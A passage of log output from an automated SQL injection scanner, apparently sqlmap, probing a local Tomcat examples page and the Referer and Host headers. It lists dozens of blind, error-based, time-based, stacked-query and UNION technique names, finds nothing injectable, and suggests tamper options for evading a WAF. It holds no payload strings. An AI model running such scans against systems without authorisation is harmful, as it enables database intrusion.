[05:08:09] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[05:08:09] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[05:08:09] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[05:08:09] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[05:08:09] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[05:08:09] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[05:08:09] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[05:08:10] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
[05:08:10] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[05:08:10] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[05:08:10] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[05:08:10] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[05:08:10] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[05:08:10] [INFO] testing 'MySQL inline queries'
[05:08:10] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:08:10] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:08:10] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:08:10] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:08:10] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:08:10] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:08:10] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:08:10] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[05:08:10] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[05:08:11] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[05:08:11] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[05:08:11] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[05:08:11] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[05:08:11] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[05:08:11] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[05:08:11] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[05:08:12] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
[05:08:12] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
[05:08:12] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
[05:08:12] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
[05:08:12] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
[05:08:12] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
[05:08:12] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[05:08:13] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[05:08:13] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[05:08:13] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[05:08:13] [INFO] testing 'MySQL AND time-based blind (ELT)'
[05:08:13] [INFO] testing 'MySQL OR time-based blind (ELT)'
[05:08:13] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[05:08:13] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[05:08:14] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:08:14] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:08:14] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[05:08:14] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[05:08:14] [INFO] testing 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)'
[05:08:14] [INFO] testing 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)'
[05:08:14] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
[05:08:14] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
[05:08:14] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
[05:08:14] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
[05:08:14] [INFO] testing 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)'
[05:08:14] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[05:08:14] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[05:08:14] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[05:08:15] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[05:08:15] [WARNING] parameter 'Referer' does not seem to be injectable
[05:08:15] [INFO] testing if parameter 'Host' is dynamic
[05:08:15] [WARNING] parameter 'Host' does not appear to be dynamic
[05:08:15] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
[05:08:15] [INFO] testing for SQL injection on parameter 'Host'
[05:08:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:08:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:08:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:08:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:08:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:08:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[05:08:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[05:08:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[05:08:18] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[05:08:18] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[05:08:18] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[05:08:18] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[05:08:18] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[05:08:18] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[05:08:18] [INFO] testing 'Generic inline queries'
[05:08:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[05:08:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[05:08:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[05:08:18] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[05:08:19] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[05:08:19] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[05:08:19] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[05:08:20] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[05:08:20] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[05:08:20] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[05:08:21] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[05:08:21] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[05:08:21] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[05:08:21] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[05:08:21] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[05:08:21] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[05:08:21] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[05:08:21] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[05:08:21] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[05:08:21] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[05:08:21] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[05:08:21] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[05:08:21] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:08:21] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[05:08:22] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[05:08:22] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[05:08:22] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[05:08:22] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[05:08:22] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[05:08:22] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[05:08:22] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:08:23] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:08:23] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:08:23] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:08:23] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[05:08:23] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[05:08:23] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:08:23] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[05:08:24] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[05:08:24] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:08:24] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[05:08:24] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[05:08:24] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[05:08:24] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[05:08:24] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[05:08:24] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[05:08:24] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[05:08:24] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[05:08:24] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[05:08:24] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
[05:08:24] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[05:08:24] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[05:08:24] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[05:08:24] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[05:08:24] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[05:08:24] [INFO] testing 'MySQL inline queries'
[05:08:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:08:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:08:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:08:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:08:24] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:08:24] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:08:24] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:08:25] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[05:08:25] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[05:08:25] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[05:08:25] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[05:08:25] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[05:08:25] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[05:08:25] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[05:08:25] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[05:08:25] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[05:08:26] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
[05:08:26] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
[05:08:26] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
[05:08:26] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
[05:08:26] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
[05:08:26] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
[05:08:26] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[05:08:26] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[05:08:26] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[05:08:27] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[05:08:27] [INFO] testing 'MySQL AND time-based blind (ELT)'
[05:08:27] [INFO] testing 'MySQL OR time-based blind (ELT)'
[05:08:27] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[05:08:27] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[05:08:27] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:08:27] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:08:27] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[05:08:27] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[05:08:27] [INFO] testing 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)'
[05:08:27] [INFO] testing 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)'
[05:08:27] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
[05:08:27] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
[05:08:27] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
[05:08:27] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
[05:08:27] [INFO] testing 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)'
[05:08:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[05:08:28] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[05:08:28] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[05:08:28] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[05:08:29] [WARNING] parameter 'Host' does not seem to be injectable
[05:08:29] [ERROR] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
[05:08:29] [WARNING] HTTP error codes detected during run:
400 (Bad Request) - 3282 times
[68/68] URL:
GET http://localhost:8080/examples/jsp/jsp2/el/functions.jsp?foo=JSP 2.0
do you want to test this URL? [Y/n/q]
> Y
[05:08:29] [INFO] testing URL 'http://localhost:8080/examples/jsp/jsp2/el/functions.jsp?foo=JSP 2.0'
[05:08:29] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=3FEBC011D98...95FFA9E148'). Do you want to use those [Y/n] Y
[05:08:29] [INFO] testing if GET parameter 'foo' is dynamic
[05:08:29] [WARNING] GET parameter 'foo' does not appear to be dynamic
[05:08:29] [WARNING] heuristic (basic) test shows that GET parameter 'foo' might not be injectable
[05:08:29] [INFO] testing for SQL injection on GET parameter 'foo'
[05:08:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:08:29] [WARNING] reflective value(s) found and filtering out
[05:08:30] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[05:08:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[05:08:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:08:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[05:08:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[05:08:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[05:08:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[05:08:34] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[05:08:34] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[05:08:34] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[05:08:34] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[05:08:34] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[05:08:34] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[05:08:34] [INFO] testing 'Generic inline queries'
[05:08:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[05:08:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[05:08:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[05:08:35] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[05:08:36] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[05:08:37] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[05:08:37] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[05:08:38] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[05:08:38] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[05:08:39] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[05:08:40] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[05:08:40] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[05:08:40] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[05:08:40] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[05:08:40] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[05:08:40] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[05:08:40] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[05:08:40] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[05:08:40] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[05:08:40] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[05:08:40] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[05:08:40] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[05:08:40] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:08:40] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[05:08:41] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[05:08:41] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[05:08:41] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[05:08:42] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[05:08:42] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[05:08:42] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[05:08:43] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:08:43] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:08:43] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:08:44] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[05:08:44] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[05:08:44] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[05:08:45] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:08:45] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[05:08:45] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[05:08:46] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:08:46] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[05:08:46] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[05:08:46] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[05:08:46] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[05:08:46] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[05:08:46] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[05:08:46] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[05:08:46] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[05:08:46] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[05:08:46] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
[05:08:46] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[05:08:46] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[05:08:46] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[05:08:46] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[05:08:46] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[05:08:46] [INFO] testing 'MySQL inline queries'
[05:08:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:08:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:08:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:08:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:08:47] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:08:47] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:08:47] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:08:47] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[05:08:47] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[05:08:48] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[05:08:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[05:08:48] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[05:08:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[05:08:48] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[05:08:49] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[05:08:49] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[05:08:49] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
[05:08:49] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
[05:08:49] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
[05:08:50] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
[05:08:50] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
[05:08:50] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
[05:08:50] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[05:08:50] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[05:08:50] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[05:08:51] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[05:08:51] [INFO] testing 'MySQL AND time-based blind (ELT)'
[05:08:51] [INFO] testing 'MySQL OR time-based blind (ELT)'
[05:08:51] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[05:08:51] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[05:08:52] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:08:52] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[05:08:52] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[05:08:52] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[05:08:52] [INFO] testing 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)'
[05:08:52] [INFO] testing 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)'
[05:08:52] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
[05:08:52] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
[05:08:52] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
[05:08:52] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
[05:08:52] [INFO] testing 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
